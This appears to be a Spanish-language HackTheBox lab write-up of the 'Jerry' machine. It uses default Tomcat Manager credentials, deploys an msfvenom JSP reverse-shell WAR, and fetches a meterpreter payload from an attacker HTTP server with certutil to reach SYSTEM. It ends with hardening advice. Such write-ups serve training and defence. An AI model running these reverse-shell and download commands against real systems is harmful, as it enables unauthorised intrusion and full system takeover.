---
layout: post
title: "HTB Writeup: Jerry"
date: 2026-04-22
category: writeups
tags: [htb, windows, easy, tomcat, default-credentials, war, jsp, meterpreter, certutil]
platform: HackTheBox
os: Windows
difficulty: Easy
has_exploits: false
resumen: "Acceso al Tomcat Manager con credenciales por defecto `tomcat:s3cret`, despliegue de un WAR malicioso y obtención directa de `NT AUTHORITY\\SYSTEM` sin escalada adicional."
permalink: /writeups/jerry/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Windows    |
| Dificultad | Easy       |
| Autor      | Ghostvyle  |

## Sinopsis

**Jerry** es una máquina Windows sencilla cuyo vector de entrada se apoya por completo en una mala exposición de **Apache Tomcat Manager**. El servicio web escucha en el puerto `8080` y permite autenticación HTTP Basic sobre `/manager/html`. Probando credenciales por defecto conocidas, se obtiene acceso con `tomcat:s3cret`. Desde ese panel es posible desplegar un archivo `.war` malicioso y ejecutar una **reverse shell JSP**.

Lo relevante de esta máquina es que el servicio de Tomcat corre directamente como **`NT AUTHORITY\SYSTEM`**, por lo que no hace falta ninguna fase de escalada de privilegios. Tras conseguir una shell básica, se transfiere un binario `meterpreter` mediante `certutil` para trabajar de forma más cómoda y, finalmente, se recuperan ambas flags desde el escritorio del usuario `Administrator`.

> Esta máquina no requiere privesc: la shell inicial ya tiene privilegios de `SYSTEM`.

---

## Reconocimiento

### Escaneo de puertos

Comenzamos con un escaneo completo de puertos TCP para identificar la superficie expuesta:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.136.9 -oG allPorts
```

![Escaneo completo de puertos con nmap](/writeups/jerry/assets/01_nmap_all_ports.png)

El resultado muestra un único puerto abierto:

- **8080/tcp** - HTTP

### Fingerprinting del servicio web

Al identificar un único servicio HTTP en `8080`, usamos `whatweb` para obtener más contexto sobre la tecnología expuesta:

```bash
whatweb 10.129.136.9:8080
```

![Identificación de Apache Tomcat con whatweb](/writeups/jerry/assets/02_whatweb_tomcat.png)

El servicio se identifica como **Apache Tomcat 7.0.88**.

Al acceder manualmente al sitio, se observa la página por defecto de Tomcat:

![Página por defecto de Apache Tomcat](/writeups/jerry/assets/03_tomcat_homepage.png)

Una revisión rápida de las rutas típicas muestra que `/manager/html` está protegido con **HTTP Basic Authentication**, lo que sugiere un panel de administración accesible desde red.

---

## Explotación

### Acceso al Tomcat Manager con credenciales por defecto

Tomcat incluye combinaciones de credenciales por defecto muy conocidas. En entornos de laboratorio y CTF es habitual que sigan activas. Probamos la combinación `tomcat:s3cret` sobre el panel del Manager:

```text
URL: http://10.129.136.9:8080/manager/html
Usuario: tomcat
Contraseña: s3cret
```

![Acceso exitoso al Tomcat Manager](/writeups/jerry/assets/04_tomcat_manager_login.png)

El acceso es válido y nos da control sobre el **Tomcat Web Application Manager**, desde donde se pueden desplegar nuevas aplicaciones web en formato `.war`.

> Si un servicio Tomcat mantiene credenciales por defecto en producción, el riesgo es crítico: el panel de administración permite subir aplicaciones arbitrarias y convertir un fallo de configuración en RCE directa.

### Generación de un WAR malicioso

Un archivo `.war` es un paquete Java para aplicaciones web. Si el Manager permite desplegarlo, basta con generar un WAR con una JSP que abra una reverse shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.178 LPORT=7777 -f war -o revshell.war
```

![Generación del WAR malicioso con msfvenom](/writeups/jerry/assets/05_msfvenom_war.png)

### Despliegue y activación

Subimos `revshell.war` desde la sección **"WAR file to deploy"** del panel y levantamos un listener:

```bash
nc -lvnp 7777
```

Después visitamos la ruta donde Tomcat expone la aplicación recién desplegada:

```text
http://10.129.136.9:8080/revshell/
```

![Reverse shell recibida tras desplegar el WAR](/writeups/jerry/assets/06_reverse_shell_nc.png)

La shell se obtiene correctamente. El detalle importante aparece de inmediato: el proceso corre con privilegios elevados y no como una cuenta de servicio restringida.

---

## Post-explotación

### Migración a Meterpreter

La shell obtenida con `nc` es suficiente para validar el acceso, pero es limitada para interactuar con comodidad. Para mejorar la post-explotación, generamos un binario `meterpreter` para Windows x64:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.178 LPORT=4444 -f exe -o shell.exe
```

![Generación del binario meterpreter](/writeups/jerry/assets/07_meterpreter_payload.png)

Servimos el binario por HTTP desde nuestra máquina atacante:

```bash
python3 -m http.server 9999
```

![Servidor HTTP exponiendo shell.exe](/writeups/jerry/assets/08_http_server_shell_exe.png)

### Transferencia con certutil

Desde la shell remota, descargamos el ejecutable usando `certutil`, una utilidad nativa de Windows que suele estar presente incluso en entornos muy restringidos:

```cmd
cd C:\Temp
certutil -urlcache -f http://10.10.15.178:9999/shell.exe shell.exe
```

![Descarga del payload con certutil](/writeups/jerry/assets/09_certutil_download.png)

Configuramos el handler en Metasploit:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.15.178
set LPORT 4444
run
```

![Handler de Metasploit a la espera de la conexión](/writeups/jerry/assets/10_msfconsole_handler.png)

Y ejecutamos el binario en la víctima:

```cmd
.\shell.exe
```

![Ejecución del payload en la máquina víctima](/writeups/jerry/assets/11_execute_shell_exe.png)

![Sesión meterpreter abierta correctamente](/writeups/jerry/assets/12_meterpreter_session.png)

### Verificación de privilegios

Una vez dentro de `meterpreter`, validamos contexto y privilegios:

```text
meterpreter> sysinfo
meterpreter> getuid
```

![Validación de contexto como NT AUTHORITY\\SYSTEM](/writeups/jerry/assets/13_sysinfo_system.png)

La sesión confirma acceso como **`NT AUTHORITY\SYSTEM`** sobre **Windows Server 2012 R2**, por lo que no es necesaria ninguna cadena adicional de escalada.

### Obtención de flags

En esta máquina, tanto `user.txt` como `root.txt` se encuentran dentro del mismo archivo:

```text
C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

![Lectura del archivo que contiene ambas flags](/writeups/jerry/assets/14_flags_file.png)

| Flag     | Ubicación                                                  |
| :------- | :--------------------------------------------------------- |
| user.txt | `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt` |
| root.txt | `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt` |

---

## Conceptos clave

### Tomcat Manager y despliegue WAR

El **Tomcat Manager** permite desplegar, iniciar y detener aplicaciones web. Si está accesible desde red y protegido con credenciales débiles o por defecto, cualquier atacante autenticado puede subir un `.war` arbitrario con código malicioso. En la práctica, eso convierte una mala configuración en una **RCE autenticada** trivial.

### Credenciales por defecto

En servicios de administración expuestos, probar combinaciones conocidas como `tomcat:tomcat`, `admin:admin` o `tomcat:s3cret` debe formar parte del reconocimiento básico. No es fuerza bruta ni ruido innecesario: es una validación rápida de errores de hardening muy comunes.

### certutil como LOLBin

`certutil` es una herramienta nativa de Windows pensada para operaciones de certificados, pero también puede descargar ficheros desde HTTP/HTTPS. Esto la convierte en un recurso clásico de **Living off the Land**, útil para transferir payloads sin depender de utilidades externas.

### Servicios corriendo como SYSTEM

Cuando un servicio expuesto corre como **`NT AUTHORITY\SYSTEM`**, cualquier ejecución remota de código heredará ese contexto privilegiado. En un entorno bien configurado, servicios como Tomcat deberían ejecutarse con una cuenta dedicada y privilegios mínimos.

---

## Soluciones

1. Cambiar o eliminar inmediatamente las credenciales por defecto de Tomcat.
2. Restringir el acceso a `/manager/html` a una red administrativa o mediante listas de control de acceso.
3. Ejecutar Tomcat con una cuenta de servicio dedicada y sin privilegios administrativos.
4. Monitorizar despliegues `.war` no autorizados y accesos anómalos al panel Manager.
